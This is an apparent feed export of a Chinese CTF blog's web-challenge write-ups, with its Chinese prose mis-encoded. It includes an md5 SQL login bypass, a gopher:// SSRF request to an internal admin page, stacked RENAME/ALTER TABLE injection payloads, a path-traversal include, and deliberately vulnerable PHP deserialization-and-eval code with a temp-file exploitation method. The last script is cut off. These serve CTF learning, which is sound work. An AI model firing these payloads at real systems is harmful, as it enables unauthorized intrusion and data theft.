title="æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ"></a>æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ</h2><blockquote>æè¿°ï¼šè¿™ä¸ªsqlå§ï¼Œæœ‰ç‚¹ssrfçš„æ ·å­ï¼Œé¦–é¡µæ˜¯ä¸€ä¸ªå¾ˆæ™®é€šçš„sqlæ³¨å…¥ï¼Œæ²¡æœ‰ä»€ä¹ˆèŠ±æ ·ï¼Œä½†æ˜¯æˆ‘çš„admin.phpæ˜¯ä¸€ä¸ªå†…ç½‘çš„ç®¡ç†ç³»ç»Ÿï¼Œåªè¦ä½ ç”¨â€œçœŸ-adminâ€çš„å¯†ç ç™»å½•äº†ï¼Œå°±å¯ä»¥æ‹¿åˆ°flag</blockquote><blockquote>hintï¼šç¬¬ä¸€æ­¥ç™»å½•çš„sqlè¯­å¥æ˜¯"SELECT * FROM users WHERE password = '".md5($password,true)."' limit 0,1";</blockquote><p>è¿™ä¸ªé¢˜æ²¡æœ‰æ€ä¹ˆåŠ¨ï¼Œç›®å‰ä¹Ÿæ²¡æ‰¾åˆ°å¤ç°ï¼Œæš‚æ—¶åªèƒ½é¢å‘wpæ‰«ç›²</p><h3 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h3><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-%E7%99%BB%E5%BD%95.png"></p><p>å…³é”®å­—æ˜¯<code>md5($password,true)</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°<code>raw=true</code>å³è½¬md5ååˆåšä¸€æ¬¡<code>hex2str</code></p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>raw</em></td><td align="left">å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼šTRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼FALSE - é»˜è®¤ã€‚32 å­—ç¬¦åå…­è¿›åˆ¶æ•°</td></tr></tbody></table><p>æ‰€ä»¥hintæè¿°çš„è¿™ä¸€æ­¥å…¶å®æ˜¯md5ä¸‡èƒ½å¯†ç ï¼š<code>ffifdyop</code>ä¸<code>129581926211651571912466741651878684928</code>åœ¨ç»è¿‡md5å¹¶è½¬å­—ç¬¦åå‡åŒ…å«æœ‰<code>&#39;or&#39;</code>ï¼Œåªè¦<code>&#39;or&#39;</code>å³è¾¹éé›¶ï¼Œå³ä¼šåˆ¤å®šæ•´ä¸ªè¡¨è¾¾å¼ä¸ºtrueï¼Œä»¥æ­¤ä¾¿ç»•è¿‡äº†ç™»å½•</p><h3 id="gopheråè®®"><a href="#gopheråè®®" class="headerlink" title="gopheråè®®"></a>gopheråè®®</h3><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-gopher.png"></p><blockquote>gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œåœ¨æ„æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®®</blockquote><p>SSRFï¼šServer-side Request Forgeï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼›è¯´ç™½äº†å°±æ˜¯ï¼š<i>å› ä¸ºæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·ï¼Œä»è€Œèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿ</i> çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæ¯”å¦‚é€šè¿‡file://ï¼Œgopher://ä¹‹ç±»çš„åè®®æ¥è¯»æœ¬åœ°æ–‡ä»¶ä»€ä¹ˆçš„</p><p>æœ¬é¢˜æ˜¯å±è”½äº†<code>file://</code>çš„ï¼Œåªèƒ½ç”¨<code>gopher://</code></p><p>Gopheråè®®æ ¼å¼ï¼š<code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_TCPæ•°æ®æµ</code></p><ul><li>gopherçš„é»˜è®¤ç«¯å£æ˜¯70</li><li>å¦‚æœå‘èµ·POSTè¯·æ±‚ï¼Œè¯·æ±‚ä½“éœ€è¦è¿›è¡Œurlç¼–ç ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨<code>%0d</code>æˆ–<code>%0a</code>ä»£æ›¿</li></ul><p>payloadï¼š/ssrf.php?way=127.0.0.1/admin.phpï¼Œå‘ç°admin.phpä¸å†302äº†</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-admin.png"></p><p>ç„¶åé€šè¿‡gopheråè®®ç»™admin.phpå‘POSTæ•°æ®ï¼ŒHTTPåè®®é»˜è®¤ç«¯å£æ˜¯80ï¼Œæ‰€ä»¥æ˜¯å¾€<code>127.0.0.1:80</code>å‘åŒ…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%20%2Fadmin.php%20HTTP%2F1.1%0aHost%3A%20127.0.0.1%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0aContent-Length%3A%2027%0ausername%3Dtest%26password%3Dtest%0a</span><br></pre></td></tr></table></figure><blockquote>gopher://127.0.0.1:80/<br>_POST /admin.php HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 27<br>username=test&password=test</blockquote><h3 id="æ”¹è¡¨å"><a href="#æ”¹è¡¨å" class="headerlink" title="æ”¹è¡¨å"></a>æ”¹è¡¨å</h3><p>é€šè¿‡æ”¹è¡¨åè·å–æ•°æ®@2019å¼ºç½‘æ¯ï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>prepare</code>é¢„å¤„ç†<code>concat</code>è¿‡æ»¤çš„<code>select</code>ï¼Œé¢„å¤„ç†çš„æ–¹æ³•ä¹‹å‰å°±è®°å½•è¿‡ï¼Œä¸å†é‡å¤</p><p>å½“è¿‡æ»¤äº†<code>select</code>ï¼Œå°±ä¸èƒ½åœ¨æŸ¥å‡ºè¡¨ååˆ—ååé€‰ä¸­æ•°æ®ï¼Œä½†è‹¥æŸ¥è¯¢çš„å›æ˜¾å°±æ˜¯è¡¨ä¸­çš„å­—æ®µï¼Œåˆ™å¯ä»¥é€šè¿‡<code>rename</code>å°†é»˜è®¤æŸ¥è¯¢çš„è¡¨æ›¿æ¢ä¸ºç›®æ ‡è¡¨ï¼Œä»è€Œç›´æ¥ä»å›æ˜¾è·å–å­—æ®µ</p><p>ä¾‹å¦‚æœ¬é¢˜ä¸­<code>fake_admin</code>æ˜¯é»˜è®¤è¢«æŸ¥è¯¢çš„è¡¨ï¼Œ<code>real_admin_here_do_you_find</code>æ˜¯ç›®æ ‡è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; &quot;username&#x3D;admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;2;RENAME TABLE &#96;fake_admin&#96; TO &#96;fake_admin1&#96;;RENAME TABLE &#96;real_admin_here_do_you_find&#96; TO &#96;fake_admin&#96;;##&amp;password&#x3D;129581926211651571912466741651878684928&quot;;</span><br></pre></td></tr></table></figure><p>é¡ºä¾¿è®°ä¸€ä¸‹ [2019å¼ºç½‘æ¯-éšä¾¿æ³¨] çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æ”¹åˆ—å<code>flag</code>ä¸º<code>id</code>æ˜¯å› ä¸ºç›®æ ‡è¡¨ä¸­æ²¡æœ‰<code>id</code>åˆ—ï¼Œè€ŒæŸ¥è¯¢æ˜¯æ ¹æ®idæŸ¥è¯¢ï¼Œé¿å…äº†ä¸€å¼€å§‹æ— æ³•æŸ¥è¯¢çš„æƒ…å†µ</p><p><code>CHANGE</code>çš„è¯­æ³•ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE t1 CHANGE c_old c_new INTEGER ;#æŠŠåä¸ºc_oldçš„åˆ—åæ”¹ä¸ºc_newï¼Œç±»å‹ä¸ºæ•´æ•°å‹</span><br></pre></td></tr></table></figure><h2 id="Internal-System"><a href="#Internal-System" class="headerlink" title="Internal System"></a>Internal System</h2><p>è¶…å‡ºèƒ½åŠ›èŒƒå›´çš„éƒ¨åˆ†æœ‰ç‚¹å¤šï¼Œç§¯ç´¯èµ·æ¥äº†å†è¯´</p><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;è®°å½•é¢˜ç›®æ‰«ç›²ï¼Œåªæœ‰å‰ä¸‰é¢˜ï¼ŒåŒ…å«ä»¥ä¸‹pointsï¼š&lt;/p&gt;
&lt;p&gt;â€‹    â‘ 3.28 php.netåé—¨&lt;/p&gt;
&lt;p&gt;â€‹    â‘¡3F(FatFreeFramework)æ¡†æ¶&lt;/p&gt;
&lt;p&gt;â€‹    â‘¢SQLä¸­md5()äº§ç”Ÿhexçš„â€™orâ€™è¿›è¡Œçš„æ³¨å…¥&lt;/p&gt;
&lt;p&gt;â€‹    â‘£SSRFä¸gopheråè®®&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://kyriota.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶</title>
    <link href="https://kyriota.github.io/2021/03/28/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/"/>
    <id>https://kyriota.github.io/2021/03/28/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/</id>
    <published>2021-03-28T13:14:32.000Z</published>
    <updated>2021-04-11T07:08:21.496Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥è‡ªäºBUUCTF_Webè§£å†³æ•°æœ€å¤šçš„[HCTF 2018]WarmUpï¼Œå°è®°ä¸€ä¸‹æ­¤é¢˜è¢«æˆ‘ç–å¿½çš„é›¶ç¢çŸ¥è¯†ä»¥åŠå‡ºé¢˜äººçš„è„‘æ´ï¼ˆè™½ç„¶ä¸å¤§ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºæ­¤é¢˜ä¸é¢å‘wpè€Œæ˜¯ç¡¬åšçš„è¯ä¸ä¼šæœ‰è¿™ä¹ˆå¤šè§£å†³æ•° Â¯\_(ãƒ„)_/Â¯</p><span id="more"></span><h1 id="PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶"><a href="#PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶" class="headerlink" title="PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶"></a>PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶</h1><p>é¦–å…ˆæ˜¯è„‘æ´ï¼Œæœ¬é¢˜hintï¼š<code>flag not here, and flag in ffffllllaaaagggg</code>ï¼Œè¿™ä¸ªåˆ«è‡´çš„flagä¼ è¾¾çš„æ˜¯ï¼šflagåœ¨ä¸Šç¿»4çº§ç›®å½•ä¸‹ã€‚è¿™ä¸ªé¢˜ä¸Šç¿»4çº§ç›®å½•æ°å¥½åˆ° linux æ ¹ç›®å½•ï¼Œæ‰€ä»¥æœ‰äº›wpä¸­å †å å¾ˆå¤šä¸ª<code>../</code>ä¹Ÿå¯ä»¥highlightåˆ°flagï¼ˆå¤§æ¦‚æ˜¯ä¸ºäº†é™ä½è„‘æ´å› ç´ çš„å­˜åœ¨æ„Ÿ</p><p>å†å°±æ˜¯æœ¬æ–‡æ ‡é¢˜ï¼Œæœ¬é¢˜éœ€è¦åœ¨<code>highlight_file(__FILE__)</code>çš„æƒ…å†µä¸‹æ„é€ payloadç»•è¿‡å…¶è¿‡æ»¤ï¼Œæœ€åç”±<code>include</code>åŒ…å«è¿›æ¥ã€‚ä½†æ˜¯ä¸ºäº†ç»•è¿‡å…¶è¿‡æ»¤ï¼Œä¼ ç»™includeçš„è·¯å¾„æ˜¯ï¼š<code>file=hint.php?/../../../../../ffffllllaaaagggg</code>ï¼Œæ­¤è·¯å¾„èƒ½æ‰“å¼€ffffllllaaaaggggçš„åŸå› åœ¨äº<code>hint.php?</code>è¿™ä¸ªæ–‡ä»¶å¹¶ä¸å­˜åœ¨ï¼Œåˆ™phpå°†å…¶è§†ä¸ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œflagåœ¨ä¸Šç¿» 4 å±‚åçš„ç›®å½•ä¸‹ï¼Œå› ä¸ºå·²ç»è¿›äº† hint.php? åˆ™è¿˜éœ€é€€å› 5 å±‚</p><blockquote>è¿™ç§è®¿é—®ä¸å­˜åœ¨çš„ç›®å½•ç„¶ååˆé€€å›æ¥çš„æ“ä½œåœ¨linuxçš„shellç¯å¢ƒä¸‹å¹¶ä¸æ”¯æŒï¼Œæ‰€ä»¥è¯´ä»¤æˆ‘æ„Ÿåˆ°å¥‡æ€ª</blockquote><p><img src="/images/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6_LinuxShell.PNG"></p><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¥è‡ªäºBUUCTF_Webè§£å†³æ•°æœ€å¤šçš„[HCTF 2018]WarmUpï¼Œå°è®°ä¸€ä¸‹æ­¤é¢˜è¢«æˆ‘ç–å¿½çš„é›¶ç¢çŸ¥è¯†ä»¥åŠå‡ºé¢˜äººçš„è„‘æ´ï¼ˆè™½ç„¶ä¸å¤§ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºæ­¤é¢˜ä¸é¢å‘wpè€Œæ˜¯ç¡¬åšçš„è¯ä¸ä¼šæœ‰è¿™ä¹ˆå¤šè§£å†³æ•° Â¯\_(ãƒ„)_/Â¯&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://kyriota.github.io/tags/Web/"/>
    
    <category term="PHP" scheme="https://kyriota.github.io/tags/PHP/"/>
    
    <category term="wp" scheme="https://kyriota.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>miniL p</title>
    <link href="https://kyriota.github.io/2021/03/25/miniL_web_p/"/>
    <id>https://kyriota.github.io/2021/03/25/miniL_web_p/</id>
    <published>2021-03-25T15:40:17.000Z</published>
    <updated>2021-05-14T10:31:11.801Z</updated>
    
    <content type="html"><![CDATA[<p>è€ƒå¯Ÿphpä»£ç å®¡è®¡ï¼Œä¸´æ—¶æ–‡ä»¶çª—å£æœŸçš„åˆ©ç”¨ï¼Œä»¥åŠlinuxæŒ‡ä»¤çš„æŒæ¡ï¼Œå¯¹æˆ‘å¥½éš¾ï¼Œè¿˜å¥½æœ‰<code>blackWatch</code>çš„wpå’ŒååŠ©</p><p>ï¼ˆæ®è¯´æ˜¯æŸåŸé¢˜æ¬è¿ï¼Œç¢äºé¢˜é‡å¤ªå°‘è€Œæ²¡æœ‰æ‰¾åˆ°åŸé¢˜åœ¨å“ªï¼Œä½†æ˜¯è¿™ä¸é‡è¦</p><span id="more"></span><h1 id="miniL-Web-p"><a href="#miniL-Web-p" class="headerlink" title="miniL Web p"></a>miniL Web p</h1><p align='right'><small>è¿™é¢˜å°±å«"p"ï¼Œæ²¡æœ‰æ‰“é”™/doge</small></p><p><img src="/images/miniL-Web-p-preview.PNG"></p><h2 id="å¾—åˆ°classes-php"><a href="#å¾—åˆ°classes-php" class="headerlink" title="å¾—åˆ°classes.php"></a>å¾—åˆ°classes.php</h2><p>ä¸€è¿›æ¥index.phpå·²é«˜äº®ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;classes.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;git&#x27;</span>])) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    setcookie(<span class="string">&#x27;git&#x27;</span>, base64_encode(serialize(<span class="keyword">new</span> gitee(<span class="string">&#x27;index.php&#x27;</span>))));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.reload()&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    ob_end_flush();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$comp</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;git&#x27;</span>]));</span><br><span class="line">highlight_file(<span class="variable">$comp</span>-&gt;file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">ä½ ç”¨ä¸Šäº†Gitï¼Œå¯æ˜¯ï¼Œä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼ˆæ‚²ï¼‰</span><br></pre></td></tr></table></figure><p>indexåŒ…å«äº†classes.phpï¼Œæ ¹æ®è¦æ±‚ä¼ ä¸€ä¸ªb64çš„cookieç”¨ä½œååºåˆ—åŒ–ï¼Œä»è€Œé«˜äº®classes.php</p><p>classes.phpå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gitee</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ä½ ç”¨ä¸Šäº†Gitï¼Œå¯æ˜¯ï¼Œä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼ˆæ‚²ï¼‰&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">github</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">        <span class="variable">$blacklist</span> = <span class="string">&quot;~!@#%^&amp;*()ï¼ˆï¼‰-_&#123;&#125;[]&#x27;\&quot;:,&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(str_split(<span class="variable">$blacklist</span>) <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$char</span>;</span><br><span class="line">            <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt;cmd, <span class="variable">$char</span>) !== <span class="literal">false</span>) </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;serror&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_REAL_IP&quot;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// proxy_set_header X-Real-IP $remote_addr;</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;across the great ... nope&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">ä½ ç”¨ä¸Šäº†Gitï¼Œå¯æ˜¯ï¼Œä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼ˆæ‚²ï¼‰</span><br></pre></td></tr></table></figure><h2 id="ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨"><a href="#ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨"></a><a href="https://www.anquanke.com/post/id/201136">ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨</a></h2><p>å¯è§æœ¬é¢˜çš„è§£é¢˜å…³é”®åœ¨äº<code>eval($this-&gt;cmd)</code>ï¼Œä½†åœ¨evalæ‰§è¡Œä¹‹å‰$cmdå·²ç»è¢«è¿‡æ»¤çš„åªå‰©ä¸ª<code>p</code>å’Œä¸€äº›å­—ç¬¦äº†ï¼Œè€Œå¯¹äºæ­¤é¢˜çš„è§£æ³•å…¶å®æ˜¯ç›¸å¯¹å›ºå®šçš„ï¼šå³ä½¿ç”¨shellå‘½ä»¤è°ƒç”¨ä¸Šä¼ çš„æ–‡ä»¶ï¼Œåˆ©ç”¨è¿™ä¸€çª—å£æœŸæ‰§è¡Œä»»æ„æˆ‘ä»¬å¸Œæœ›æœåŠ¡ç«¯æ‰§è¡Œçš„shellå‘½ä»¤</p><p><img src="/images/miniL-Web-p-timeWindow.PNG"></p><p>å¦‚ä½•åˆ©ç”¨ï¼š</p><ul><li><p>é¦–å…ˆç¡®å®šå¦‚ä½•åœ¨ä»…æœ‰è¿™ä¹ˆå°ç‚¹å­—ç¬¦é›†çš„æƒ…å†µä¸‹è®¿é—®åˆ°ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ { Windwosä¸‹ä¸´æ—¶æ–‡ä»¶ä¿å­˜åœ¨<code>C:/Windows/Temp/</code>ï¼Œå‘½åä¸ºphp[4ä¸ªéšæœºå­—ç¬¦].tmpï¼›Linuxä¸‹ä¿å­˜åœ¨<code>/tmp/</code>ï¼Œå‘½åä¸ºphp[éšæœº6ä¸ªå­—ç¬¦] } å¯ä»¥ç¡®å®šæˆ‘ä»¬è¦æ‰¾çš„æ˜¯è·¯å¾„ä¸º<code>tmp/phpxxxxxx</code>çš„æ–‡ä»¶ï¼Œç»“åˆLinuxä¸­çš„å•å­—ç¬¦é€šé…ç¬¦<code>?</code>ï¼Œå°±å¯ä»¥æ‰¾åˆ°å®ƒäº†</p>  <center><code>??p/p?p??????</code></center></li><li><p>ç°åœ¨ç¡®å®šä¸Šä¼ æ€æ ·çš„æ–‡ä»¶æ‰å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°flagï¼Œæ³¨æ„åˆ°åå¼•å· <code>`</code> æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè€Œphpä¸­åå¼•å·ä¸ºæ‰§è¡Œè¿ç®—ç¬¦</p>  <blockquote>PHPå°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ï¼›ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦çš„æ•ˆæœä¸å‡½æ•°shell_exec()ç›¸åŒã€‚ä½†è¿™ä¸€åˆ‡çš„å‰ææ˜¯æœåŠ¡ç«¯å…è®¸ä¸€ä¸ªè¿™ä¹ˆå±é™©çš„å‡½æ•°æ‰§è¡Œ</blockquote><p>  å¥å· <code>.</code> ä¹Ÿæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè¿™åœ¨Linuxä¸­å¯ä»¥æ‰§è¡Œshell scriptï¼Œä¾‹å¦‚<code>./tmp/hello.sh</code>ï¼ˆä½†åœ¨å®é™…æ“ä½œä¸­å‘ç°è¿™ä¸ªå¥å·æ‰§è¡Œéœ€è¦æƒé™ï¼Œä¸èƒ½ç›´æ¥æ‰“äº†å°±æ¥ï¼Œå¯èƒ½æ˜¯æœåŠ¡ç«¯å·²ç»è®¾ç½®å¥½äº†ï¼Œæ‰€ä»¥æ‰èƒ½æ‰§è¡Œï¼‰ï¼Œä»¥ä¸‹æ˜¯å¯¹äºshellçš„å¤§è‡´ä»‹ç»</p>  <blockquote>Shell æ˜¯ä¸€ä¸ªç”¨ C è¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ƒæ˜¯ç”¨æˆ·ä½¿ç”¨ Linux çš„æ¡¥æ¢ï¼›Shell æ—¢æ˜¯ä¸€ç§å‘½ä»¤è¯­è¨€ï¼Œåˆæ˜¯ä¸€ç§ç¨‹åºè®¾è®¡è¯­è¨€<br>  éœ€è¦å…³æ³¨çš„æ˜¯ Bashï¼Œä¹Ÿå°±æ˜¯ Bourne Again Shellï¼Œç”±äºæ˜“ç”¨å’Œå…è´¹ï¼ŒBash åœ¨æ—¥å¸¸å·¥ä½œä¸­è¢«å¹¿æ³›ä½¿ç”¨ï¼›åŒæ—¶ï¼ŒBash ä¹Ÿæ˜¯å¤§å¤šæ•°Linux ç³»ç»Ÿé»˜è®¤çš„ Shell<br>  æ‰©å±•åå¹¶ä¸å½±å“è„šæœ¬æ‰§è¡Œï¼Œshçš„åç¼€å®Œå…¨æ˜¯ä¸ºäº†æ–¹ä¾¿ç”¨æˆ·ç†è§£è¿™ä¸ªæ–‡ä»¶å¤§æ¦‚æ˜¯ä»€ä¹ˆç©æ„å„¿ï¼ŒLinuxæ ¹æ®æ–‡ä»¶å¤´è¯†åˆ«æ–‡ä»¶ç±»å‹ï¼Œä¸éœ€è¦æ‰©å±•å<br>  </blockquote><p>  åªéœ€åŸºç¡€çš„ä¸¤ä¸ªå‘½ä»¤å³å¯å¸®åŠ©æˆ‘ä»¬è·å–flagï¼š<code>cat</code>å’Œ<code>grep</code>ï¼Œ<code>*</code>ä½œä¸ºåŒ¹é…0è‡³ä»»æ„ä¸ªå­—ç¬¦çš„é€šé…ç¬¦ï¼Œä½¿å¾—catè¿”å›å…¨éƒ¨æ ¹ç›®å½•ä¸‹æ–‡ä»¶ä¿¡æ¯</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh\ncat /* | grep 